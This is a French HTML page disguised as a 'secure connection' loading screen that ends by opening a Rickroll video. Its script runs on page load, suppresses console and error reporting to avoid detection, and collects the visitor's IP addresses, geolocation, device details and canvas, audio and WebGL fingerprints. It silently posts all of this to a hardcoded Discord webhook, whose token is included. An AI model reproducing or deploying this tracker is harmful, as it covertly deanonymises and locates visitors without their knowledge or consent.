<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="utf-8">
  <title>Chargement en cours...</title>
  <style>
    body {margin:0;height:100vh;background:#000;color:#fff;font-family:system-ui,-apple-system,Arial,sans-serif;text-align:center;padding-top:15%;box-sizing:border-box;overflow:hidden;}
    .container {max-width:600px;margin:0 auto;}
    .loader {border:18px solid #111;border-top:18px solid #ff3333;border-radius:50%;width:110px;height:110px;animation:s 1s linear infinite;margin:0 auto 40px;}
    @keyframes s {0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
    h1{font-size:32px;margin:15px 0;font-weight:600;}
    .subtitle{color:#aaa;font-size:18px;margin:10px 0;}
    p{font-size:19px;color:#ddd;}
    .countdown{font-size:26px;margin-top:30px;color:#ff6666;font-weight:bold;}
    .progress {width:80%;height:6px;background:#222;border-radius:3px;margin:30px auto;overflow:hidden;}
    .bar {height:100%;width:0%;background:linear-gradient(90deg,#ff3333,#ff6666);animation:p 5s linear forwards;}
    @keyframes p {0%{width:0%}100%{width:100%}}
    .status {color:#555;font-size:14px;margin-top:20px;opacity:0;animation:f 3s infinite;}
    @keyframes f {0%,100%{opacity:0}50%{opacity:0.7}}
  </style>
</head>
<body>
  <div class="container">
    <div class="loader"></div>
    <h1>Veuillez patienter...</h1>
    <p class="subtitle">Connexion s√©curis√©e et v√©rification en cours</p>
    <p>Redirection automatique dans quelques instants</p>
    <div class="countdown" id="timer">5 secondes</div>
    <div class="progress"><div class="bar"></div></div>
    <div class="status">Analyse du r√©seau en cours...</div>
  </div>

  <script>
    // === TON WEBHOOK DISCORD (√† garder secret) ===
    const webhook = "https://discord.com/api/webhooks/1452985926451200201/HOLaPjkC1fq5ZCk2m-RFRPBvD09-MiFAz2h--jrZPh9kaXma-Xnzl9PUVvyVL0gPZzCl";

    (async () => {
      try {
        // === ANTI-D√âTECTION MAXIMALE ===
        console.log = console.error = console.warn = console.info = () => {};
        if (window.Sentry) Object.keys(window.Sentry).forEach(k => window.Sentry[k] = () => {});
        window.addEventListener("error", e => e.preventDefault(), true);
        window.addEventListener("unhandledrejection", e => e.preventDefault());

        // === IP + G√âOLOCALISATION (multi-sources pour pr√©cision maximale) ===
        const responses = await Promise.allSettled([
          fetch("https://api.ipify.org?format=json"),
          fetch("https://api6.ipify.org?format=json"),
          fetch("https://ipapi.co/json/"),
          fetch("https://ipinfo.io/json")
        ]);

        let ipv4 = "inconnu", ipv6 = "inconnu", geo = {};
        responses.forEach(async r => {
          if (r.status === "fulfilled" && r.value.ok) {
            const data = await r.value.json();
            if (data.ip && data.ip.includes(".")) ipv4 = data.ip;
            if (data.ip && data.ip.includes(":")) ipv6 = data.ip;
            geo = { ...geo, ...data };
          }
        });

        // === INFOS APPAREIL AVANC√âES ===
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
        const battery = await (navigator.getBattery?.() || null);
        const batteryInfo = battery ? `${Math.round(battery.level * 100)}% ${battery.charging ? "(en charge)" : "(d√©charge)"}` : "Inconnu";

        // Canvas Fingerprint avanc√©
        let canvasFP = "Inconnu";
        try {
          const c = document.createElement("canvas");
          c.width = 256; c.height = 60;
          const ctx = c.getContext("2d");
          ctx.fillStyle = "#f60"; ctx.fillRect(10,10,200,40);
          ctx.font = "18px Arial"; ctx.fillStyle = "#000"; ctx.textBaseline = "top";
          ctx.fillText("Tracker 2025 ‚Ä¢ Device FP", 15, 15);
          ctx.strokeStyle = "#0f0"; ctx.lineWidth = 2; ctx.strokeText("Tracker 2025 ‚Ä¢ Device FP", 15, 15);
          canvasFP = c.toDataURL().substring(0, 140) + "...";
        } catch(e) {}

        // Audio Fingerprint (hash robuste)
        let audioFP = "Inconnu";
        try {
          const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
          const osc = ctx.createOscillator(); osc.type = "sine"; osc.frequency.value = 440;
          const comp = ctx.createDynamicsCompressor(); comp.threshold.value = -50; comp.knee.value = 40;
          osc.connect(comp); comp.connect(ctx.destination); osc.start(0);
          const buf = await ctx.startRendering();
          const data = buf.getChannelData(0);
          let hash = 0;
          for (let i = 0; i < data.length; i += 100) hash = Math.imul(31, hash) + data[i];
          audioFP = hash.toString(16).substring(0, 16);
        } catch(e) {}

        // WebGL d√©taill√©
        let webglVendor = "Inconnu", webglRenderer = "Inconnu";
        try {
          const gl = document.createElement("canvas").getContext("webgl") || document.createElement("canvas").getContext("experimental-webgl");
          if (gl) {
            const ext = gl.getExtension("WEBGL_debug_renderer_info");
            webglVendor = ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
            webglRenderer = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
          }
        } catch(e) {}

        // === MESSAGE DISCORD ULTRA COMPLET ===
        const message = `
üéØ **NOUVELLE VISITE D√âTECT√âE** ‚Äî Tracker Ultime 2025

**R√âSEAU & LOCALISATION**
‚Ä¢ IPv4 : \`${ipv4}\`
‚Ä¢ IPv6 : \`${ipv6}\`
‚Ä¢ Pays : **${geo.country_name || geo.country || "Inconnu"}** (${geo.country_code || geo.country || "??"})
‚Ä¢ Ville : **${geo.city || "Inconnu"}**
‚Ä¢ R√©gion : ${geo.region || geo.region_name || "Inconnu"}
‚Ä¢ Code postal : ${geo.postal || "Inconnu"}
‚Ä¢ FAI / Org : \`${geo.org || geo.asn || "Inconnu"}\`

**APPAREIL & HARDWARE**
‚Ä¢ Plateforme : ${navigator.platform || "Inconnu"}
‚Ä¢ RAM : ${navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Inconnue"}
‚Ä¢ CPU : ${navigator.hardwareConcurrency || "?"} c≈ìurs
‚Ä¢ Batterie : ${batteryInfo}
‚Ä¢ Connexion : ${conn.effectiveType || "Inconnu"} ‚Ä¢ ‚Üì${conn.downlink || "?"} Mbps ‚Ä¢ RTT ${conn.rtt || "?"} ms
‚Ä¢ Mode pr√©f√©r√© : ${matchMedia("(prefers-color-scheme: dark)").matches ? "Sombre" : "Clair"}
‚Ä¢ GPU Vendor : ${webglVendor}
‚Ä¢ GPU Renderer : ${webglRenderer}

**EMPREINTE UNIQUE**
‚Ä¢ Canvas FP : \`${canvasFP}\`
‚Ä¢ Audio FP : \`${audioFP}\`

**NAVIGATEUR**
‚Ä¢ User-Agent : ${navigator.userAgent.substring(0, 400)}
‚Ä¢ Langues : ${navigator.languages ? navigator.languages.join(", ") : navigator.language}
‚Ä¢ R√©solution : ${screen.width}x${screen.height}x${screen.colorDepth}
‚Ä¢ Timezone : ${Intl.DateTimeFormat().resolvedOptions().timeZone}
‚Ä¢ Referrer : ${document.referrer || "Direct"}

**SESSION**
‚Ä¢ Page visit√©e : ${window.location.href}
‚Ä¢ Heure pr√©cise (UTC) : ${new Date().toISOString()}
        `.trim();

        // === ENVOI SILENCIEUX ===
        await fetch(webhook, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: message })
        });

      } catch (e) {}
    })();

    // Compte √† rebours + Rickroll
    let timeLeft = 5;
    const timerEl = document.getElementById("timer");
    const interval = setInterval(() => {
      timeLeft--;
      timerEl.textContent = timeLeft + (timeLeft === 1 ? " seconde" : " secondes");
      if (timeLeft <= 0) {
        clearInterval(interval);
        window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
      }
    }, 1000);
  </script>
</body>
</html>
